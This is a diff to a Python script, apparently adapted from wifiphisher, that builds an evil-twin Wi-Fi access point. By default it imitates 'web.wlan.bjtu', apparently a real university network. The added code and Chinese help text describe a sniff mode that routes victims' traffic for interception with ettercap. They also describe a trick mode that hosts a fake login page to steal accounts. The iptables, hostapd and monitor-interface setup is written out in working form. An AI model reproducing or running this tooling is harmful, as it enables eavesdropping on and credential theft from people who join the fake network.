@@ -3,11 +3,12 @@
 
 from subprocess import check_output
 import logging
+import argparse
+import fcntl
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
-POST_VALUE_PREFIX = "wfphshr"
 NETWORK_IP = "10.0.0.0"
 NETWORK_MASK = "255.255.255.0"
 NETWORK_GW_IP = "10.0.0.1"
@@ -27,10 +28,62 @@ GR = '\033[37m'  # gray
 T = '\033[93m'  # tan
 
 
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "-c",
+        "--channel",
+        help="选择伪AP所在channel，默认为1",
+        default="1"
+    )
+    parser.add_argument(
+        "-i",
+        "--interface",
+        help="选择网卡接口 栗子: -i wlan0"
+    )
+    parser.add_argument(
+        "-e",
+        "--essid",
+        help="AP的essid，默认为'web.wlan.bjtu'"
+    )
+    parser.add_argument(
+        "-m",
+        "--mode",
+        help="sniff 嗅探模式：无登录，wifi网络联通，可用于嗅探数据\n" +
+             "trick 欺骗模式：挂出虚假登陆网页：wifi网络不联通，可用于窃取登录账号"
+    )
+    parser.add_argument(
+        "-t",
+        "--time",
+        help="热点开放时间(小时) 栗子： -t 5"
+    )
+    return parser.parse_args()
+
+
+def get_hostapd():
+    if not os.path.isfile('/usr/sbin/hostapd'):
+        install = raw_input(
+            ('[' + T + '*' + W + '] hostapd not found ' +
+             'in /usr/sbin/hostapd, install now? [y/n] ')
+        )
+        if install == 'y':
+            os.system('apt-get -y install hostapd')
+        else:
+            sys.exit(('[' + R + '-' + W + '] hostapd' +
+                      'not found in /usr/sbin/hostapd'))
+    if not os.path.isfile('/usr/sbin/hostapd'):
+        sys.exit((
+            '\n[' + R + '-' + W + '] Unable to install the \'hostapd\' package!\n' +
+            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
+            'Please follow the link below to configure your sources.list\n' +
+            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
+            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
+            '[' + G + '+' + W + '] Rerun the script again to install hostapd.\n' +
+            '[' + R + '!' + W + '] Closing'
+        ))
+
+
 def shutdown():
-    """
-    Shutdowns program.
-    """
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
@@ -38,10 +91,7 @@ def shutdown():
     os.system('pkill airbase-ng')
     os.system('pkill dnsmasq')
     os.system('pkill hostapd')
-    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-        os.remove('/tmp/wifiphisher-webserver.tmp')
-    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
-        os.remove('/tmp/wifiphisher-jammer.tmp')
+    os.system('sudo apachectl stop')
     if os.path.isfile('/tmp/hostapd.conf'):
         os.remove('/tmp/hostapd.conf')
     reset_interfaces()
@@ -78,6 +128,15 @@ def reset_interfaces():
             Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
 
 
+def get_mac(mon_iface):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
+    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+    print ('[' + G + '*' + W + '] Monitor mode: ' + G
+           + mon_iface + W + ' - ' + O + mac + W)
+    return mac
+
+
 def start_ap(mon_iface, channel, essid, args=None):
     print '[' + T + '*' + W + '] Starting the fake access point...'
     config = (
@@ -92,7 +151,6 @@ def start_ap(mon_iface, channel, essid, args=None):
     with open('/tmp/hostapd.conf', 'w') as dhcpconf:
         dhcpconf.write(config % (mon_iface, essid, channel))
 
-    # 这里容易出错，我要看到它的输出
     # Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
     os.system('hostapd /tmp/hostapd.conf &')
 
@@ -159,38 +217,59 @@ if __name__ == "__main__":
     print (B + '   [---]     Follow me on Github: Xyntax     [---]')
 
 
-    # Parse args
-    # args = parse_args()
-    # Are you root?
+    # 获取用户输入并配置
+    args = parse_args()
+
+    channel = '1'
+    if args.channel:
+        channel = args.channel
+
+    ap_iface = 'wlan0'
+    if args.interface:
+        ap_iface = args.interface
+
+    essid = 'web.wlan.bjtu'
+    if args.essid:
+        essid = args.essid
+
+
+    # 确保权限为root
     if os.geteuid():
         sys.exit('[' + R + '-' + W + '] Please run as root')
-    # Get hostapd if needed
-    # get_hostapd()
-    os.system('sudo nmcli radio wifi off')
+
+    # 检查hostapd 没有自动安装
+    get_hostapd()
+
+    os.system('nmcli radio wifi off')
     os.system('rfkill unblock all')
 
-    Popen(
-        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
-        stdout=DN,
-        stderr=PIPE
-    )
-
-    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
+    print '[' + T + '*' + W + ']started DHCP, set up iptables'
 
     time.sleep(3)
 
-    channel = '6'
-    essid = 'web.wlan.bjtu'
-    ap_iface = 'wlan0'
-
-
-    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    # os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
-    # os.system('iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT')
-    # os.system('iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356')
+    if args.mode:
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        if args.mode == 'sniff':
+            print '[' + T + '*' + W + '] Enter sniff mode ...'
+            os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
+            os.system('iptables -A FORWARD -i ' + ap_iface + ' -o eth0 -j ACCEPT')
+            os.system('iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356')
+        elif args.mode == 'trick':
+            print '[' + T + '*' + W + '] Enter trick mode ...'
+            print '[' + T + '*' + W + '] 程序运行结束后请额外开启本机服务器挂网页(懒得实现了^_^) ...'
+            print '[' + T + '*' + W + '] 可以使用命令如 sudo apachectl -k start ...'
+            time.sleep(1)
+            # os.system('sudo apachectl -k start')
+        else:
+            print '[' + R + '*' + W + '] mode选项出错'
+            shutdown()
+    else:
+        print '[' + R + '*' + W + '] mode选项为必需项'
+        shutdown()
+    time.sleep(1)
 
     # Start AP
-    mon_iface = '00:c0:ca:42:22:03'
+    mon_iface = get_mac(ap_iface)
     start_ap(ap_iface, channel, essid)
 
     dhcpconf = dhcp_conf(ap_iface)
@@ -204,8 +283,9 @@ if __name__ == "__main__":
            T + channel + W + ' via ' + T + mon_iface +
            W + ' on ' + T + str(ap_iface) + W)
 
-    # Main loop.
     try:
-        os.system('ettercap -puTqi ' + ap_iface)
+        print('[' + G + '+' + W + ']' + '好啦，客官可以开ettercap嗅探了')
+        print('[' + G + '+' + W + ']' + '任何问题请反馈给我哦:xyntax@163.com')
+        time.sleep(int(args.time) * 3600)
     except KeyboardInterrupt:
         shutdown()
